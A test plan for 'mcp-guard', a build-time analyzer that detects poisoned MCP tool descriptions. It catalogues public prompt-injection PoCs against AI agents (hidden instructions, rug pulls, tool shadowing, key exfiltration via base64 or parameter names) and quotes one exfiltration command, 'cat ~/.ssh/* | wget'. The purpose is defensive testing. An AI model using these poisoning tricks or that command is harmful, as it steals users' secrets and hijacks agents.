# mcp-guard — Known-Attack Corpus Test Plan

How the public MCP poisoning PoCs become a layered, credible test suite, grounded in the actual analyzer
code and the actual `mcp-server-factory` harness. This is the implementation guide; 1.0.0 is gated on it.

> **Status:** plan only. Verified against the analyzer source and the `mcp-server-factory` 1.0.0 API
> (MCP SDK 1.4.0) in June 2026. Sections marked **DECISION** need a call before implementation.

---

## Architecture note (corrected)

mcp-guard is a **Roslyn analyzer**: source-in, diagnostics-out. Its rule tests compile fixtures **in
memory** via `Microsoft.CodeAnalysis.Testing` and never run a server. Two corrections to the original
sketch, both verified against the code:

1. **No on-disk fixtures.** The verifiers (`CSharpAnalyzerVerifier`, `CSharpCodeFixVerifier`) accept the
   fixture **only as an inline string** (`TestCode` / `TestState.AdditionalFiles` from strings). There is
   no `tests/fixtures/` directory, no file-reading overload, and the test csproj copies no content. A
   `known-attacks/<slug>/Server.cs` on-disk layout is **not consumable** without adding file-read +
   `<EmbeddedResource>`/copy plumbing. The corpus is therefore modeled as **inline payload data** (one
   `[Theory]` row per attack), with provenance carried in the data, not on disk.
2. **`mcp-server-factory` powers the live tiers, not the rule tests.** It boots a real in-process MCP
   server and a real client, so it proves round-trip authenticity (Tier 3) and drives the runtime
   rug-pull demonstration (Tier 4) — things the static tests structurally cannot do.

---

## The verified corpus

Seven public **defensive-research** PoCs, all confirmed to exist, with payloads transplanted into C#
fixtures. **Every exfil sink is neutralized to `http://example.test`** (or `example@example.test` /
`+10000000000`); no fixture points at a live collector. Provenance (source URL + attack class) travels
with each case.

| # | Source | Attack class | Payload surface | Expected rules | Catchability |
|---|--------|--------------|-----------------|----------------|--------------|
| 1 | DVMCP challenge 2 | Tool poisoning (hidden `<IMPORTANT>` instructions) | tool `[Description]` | MCPG008 + MCPG001 + MCPG006 | static |
| 2 | DVMCP challenge 3 | Excessive permissions / path traversal | *(benign description; exploit is code logic)* | none | **runtime-only (boundary)** |
| 3 | DVMCP challenge 4 | Rug pull (`__doc__` swap on call ≥3) | tool `[Description]`, mutated at runtime | MCPG008/001/006 on the static form; **MCPG013** for source drift | partial (runtime swap out of scope) |
| 4 | DVMCP challenge 5 | Tool shadowing + cross-tool deputy | `[Description]` `<HIDDEN>` + duplicate tool **Name** | MCPG008 + MCPG009 + MCPG001/006 | partial (cross-server selection runtime) |
| 5 | DVMCP challenge 6 | Indirect injection via uploaded document | runtime data argument | none | **runtime-only (boundary)** |
| 6 | Invariant `direct-poisoning` | Secret-file exfil via `sidenote` sink | tool `[Description]` + param sink | MCPG003 + MCPG004 + MCPG008/006 → **MCPG012** | static |
| 7 | Invariant `shadowing` | Email redirect via cross-tool hijack | tool `[Description]` referencing `send_email` | MCPG009 + MCPG006 + MCPG004 | static |
| 8 | Invariant `whatsapp-takeover` | Rug-pull + shadowing + **whitespace hiding** | mutated `[Description]` with long space run | MCPG010 + MCPG009 + MCPG008/006/004 | partial |
| 9 | Repello `mcp-exploit-demo` | SSH-key exfil via **base64 blob** + rug-pull | `[Description]` with encoded payload | MCPG011 + MCPG003 + MCPG004 + MCPG008/006 → MCPG012 | partial |
| 10 | CyberArk FSP — param name | Instruction in **parameter name** (`content_from_reading_ssh_id_rsa`) | parameter identifier | **none today (gap — see below)** | static |
| 11 | CyberArk FSP — extra schema field | Instruction in a **non-standard schema field** | JSON schema, not `[Description]` | **none (out of analyzer's view)** | static-but-unseen (boundary) |
| 12 | CyberArk ATPA | Payload in **runtime tool output/errors** | runtime output | none | **runtime-only (boundary)** |
| 13 | Backslash web-scraper | Indirect injection via scraped HTML | runtime fetched data | none | **runtime-only (boundary)** |
| 14 | aminrj-labs `attack1_direct_poison` | Secret-file exfil (offline Invariant clone) | tool `[Description]` + param sink | MCPG003 + MCPG004 + MCPG008/006 → MCPG012 | static |
| 15 | roslyn-codelens CVE (GHSA-552p-8f74-6x7q) | RCE via analyzer loading | *(no description payload)* | none | out of scope (narrative only) |

The **boundary rows (2, 5, 11, 12, 13, 15)** are kept deliberately as **negative-scope tests**: the suite
asserts mcp-guard does *not* claim them, and the scorecard reports them as explicitly out-of-scope.
Drawing the line is the credibility.

---

## Test tiers

### Tier 1 — Analyzer rule unit tests (verifier-based) — exists, extend
One class per `MCPGxxx` (already ~94 tests). Each rule keeps: a positive (fires at the right span), a
clean look-alike (stays silent — the FP guard), config/severity via `.editorconfig`, inline suppression,
encoding fixtures where relevant (Unicode-tag, zero-width, variation-selector, ANSI CSI/OSC), and a
code-fix verifier for rules with fixes. **Pattern:** inline `Harness` const + `With(body)` raw-string
literals + `[Theory]` over `net8.0`/`net10.0` (matches the 18 existing test files).

### Tier 2 — Known-attack corpus — the PoC linkage (static, fast)
A single source-of-truth corpus expressed as **inline data**, not on-disk files:

- A `KnownAttack` record: `{ Slug, SourceUrl, AttackClass, Payload (neutralized), Surface, ExpectedRules[], Catchability }`.
- A `[Theory]` driven by the corpus: for each `static`/`partial` case, wrap `Payload` into a minimal
  `[McpServerTool, Description("…")]` (or `Name=`/parameter) stub and assert exactly `ExpectedRules`
  fire; for each `boundary` case, assert **no** diagnostic (negative scope).
- The corpus data also **generates** the PoC→rule mapping table and feeds the Tier-3 scorecard, so there
  is one place that links PoC → fixture → rule → scorecard row.
- Provenance + the neutralization policy live in a short `tests/.../KnownAttacks/README.md`.

### Tier 3 — Round-trip authenticity & scorecard (`mcp-server-factory`) — the proof
**Implemented** in `McpGuard.IntegrationTests` (`LiveServerTests`): a poisoned `[Description]` is booted
as a real in-process server and asserted to survive serialization into the served `tools/list`
(`McpClientTool.Description`), with a benign control. A **separate** project (do not mix the runtime
harness into the Roslyn-pinned analyzer-test project) referencing the `McpServerFactory` NuGet. For each
`static` corpus case:

- Boot the same poisoned tool in-process (`factory.CreateTestClientAsync()`), call `tools/list`, and
  assert the neutralized payload survives serialization into the served `McpClientTool.Description` /
  `ProtocolTool` (the wire-deserialized metadata).
- A pass means: *"had this shipped, the client would have received the poison; the analyzer stops it at
  build."* This suite **emits the scorecard** (N caught / M tested, with the boundary drawn) as a
  generated artifact for the README.

### Tier 4 — Rug-pull authenticity (MCPG013) (`mcp-server-factory`) — the differentiator
**Implemented** in `McpGuard.IntegrationTests` (`LiveServerTests`): a benign tool is booted, then its
description is swapped at runtime via the live tool collection; the next `tools/list` returns the
poisoned text and a `tools/list_changed` notification fires — proving the runtime rug-pull mcp-guard's
MCPG013 mirrors at the source level. (Fast and in-process, so it runs in the standard PR suite.)

The factory can serve **different metadata on a second `tools/list`** today (verified): reach the live
`McpServerPrimitiveCollection<McpServerTool>` via
`factory.Services.GetRequiredService<IOptions<McpServerOptions>>().Value.ToolCollection`, then
`Remove` the tool and `Add` a replacement with a poisoned description (`McpServerTool.Create(...,
new McpServerToolCreateOptions { Description = "…" })`). The next `ListToolsAsync` returns the mutated
description and a `notifications/tools/list_changed` fires (the factory's `NotificationRecorder` captures
it).

**What this tier proves (and the boundary it draws):** mcp-guard's MCPG013 is a **build-time, source-level**
rug-pull guard — it catches a description changed in *source* against a committed baseline. The factory
demonstrates the **runtime** swap mcp-guard cannot see, which is *why* MCPG013 exists as the static proxy.
So Tier 4 has two coherent halves:
1. **Static (Tier 1, already done):** edit a fixture's source description with a committed baseline →
   MCPG013 fires (`DescriptionBaselineTests`).
2. **Live boundary:** boot the original and mutated servers, show the served description actually differs
   over the wire — proving the source edit equals a real served-metadata change — and assert mcp-guard
   makes **no runtime claim** (the live swap is out of scope; the source pin is the defense).

> **DECISION 4A.** Tier 4 as a pure *demonstration* (above) needs no analyzer change. If instead you want
> an actual **runtime** integrity monitor (compare live `tools/list` to a pinned baseline), that is a
> **new feature** beyond a build-time analyzer — out of 1.0 scope unless you want it.

---

## Cross-cutting (corrected)

- **Robustness fixtures.** Assert detection survives **const concatenation** (already tested), **verbatim
  `@"…"` multiline**, and **raw `"""…"""`** strings. **Drop "string interpolation"** — an interpolated
  string is not a compile-time constant, so it *cannot* be a `[Description]` argument; such a fixture
  would fail to compile, not exercise the analyzer. (Extraction is `GetConstantValue`-only.)
- **Multi-signal escalation.** One fixture: a secret reference (**MCPG003**) **and** an external sink
  (**MCPG004**) on one description → **MCPG012 (Error)**. Model on the passing `EscalationTests` case.
  *(The original "MCPG010 secrecy" was a double error: MCPG010 is whitespace padding; secrecy phrasing is
  MCPG001, coercion is MCPG006 — none of which participate in the escalation. Optionally add an MCPG001/006
  signal for realism, but it is orthogonal to the Error.)*
- **Surface coverage.** Fixtures must exercise the surfaces the analyzer **actually** scans: member
  `[Description]`, **parameter `[Description]`**, type `[Description]`, and member **`Name="…"`**. The
  analyzer does **not** see parameter *names*, enum-member `[Description]`s, default values, or
  non-standard JSON-schema fields — see gaps.

---

## Known gaps surfaced by the corpus — **RESOLVED**

The corpus (CyberArk FSP + MCPTox MCP-11) exposed statically-catchable surfaces the analyzer did not
cover. Resolutions:

- **G1 — parameter / enum-member NAMES — CLOSED.** The analyzer now scans each parameter identifier and
  the member names of an enum used as a tool parameter type, running the existing rules over them, so a
  payload smuggled into `content_from_reading_ssh_id_rsa` trips MCPG003. (Enum member iteration is
  deduplicated per compilation.) Covered by `ParameterAndEnumNameTests`.
- **G2 — encoded-blob decode-then-rescan — CLOSED.** A base64 blob that decodes to readable text is
  re-scanned for a secret (MCPG003) and a sink (MCPG004); the combination escalates to MCPG012 (Error)
  instead of hiding behind advisory MCPG011. `curl`/`wget` were added to the transmit verbs so the
  canonical `cat ~/.ssh/* | wget http://…` is recognized once decoded. Covered by
  `EncodedBlobEscalationTests`.
- **G3 — non-standard schema fields (CyberArk "extra field") — DOCUMENTED as out-of-scope.** The analyzer
  reads C# attributes, not the emitted JSON schema, so an `extra`/`note` schema field is invisible by
  design. Recorded as a boundary in the [threat model](THREAT-MODEL.md); corpus row 11 is a negative-scope
  test.

---

## Coverage scorecard

The coverage-and-precision story is the in-repo [known-attack corpus](../tests/McpGuard.Analyzers.Tests/KnownAttackCorpusTests.cs)
— 9 PoC attacks (each asserting its exact rule set), 6 runtime-only boundary cases (asserting silence),
and 8 benign look-alike controls (asserting zero false positives) — plus the live tiers. It is summarized
for consumers in [SCORECARD.md](SCORECARD.md), framed against **MCP-38 Category I** (≈ MCP-10/11/13/15 +
MCP-16 rug-pull) and **OWASP MCP03**, not all 38 / all 10.

> **External benchmark (MCPTox): not pursued.** A large external recall metric (e.g. MCPTox,
> arXiv 2508.14925) was considered but dropped — its dataset is behind a bot-blocked host with an
> unconfirmed license, so it cannot be vendored or run in CI. The in-repo corpus above is the coverage
> story; revisit only if a usable, licensed source appears.

---

## CI wiring & sequencing

- **Every PR (fast):** Tier 1 + Tier 2 (static, in-memory compile). Fail the build on any regression.
- **Every PR (also fast, in-process):** Tier 3 + Tier 4 boot servers but complete in well under a second,
  so they run in the standard suite rather than a separate scheduled job.

**Sequence (done):**
1. Tier 1 + Tier 2 for the deterministic core — proves the rules and the corpus data format end-to-end.
2. Resolve **G1 / G2** — they changed which corpus rows are green.
3. Stand up `McpGuard.IntegrationTests` + Tier 3 round-trip authenticity.
4. Tier 4 rug-pull demonstration alongside the MCPG013 story.
5. Adversarial review + precision/bypass hardening + benign controls.
6. Then cut 1.0.0.

---

## Provenance & safety

These are transplanted payloads from public **defensive-research** PoCs, used for detection testing only.
All exfil endpoints are neutralized to `http://example.test`; no fixture contacts a live host. Every case
links its source URL. The factory-based tiers run fully in-process and make no network calls.
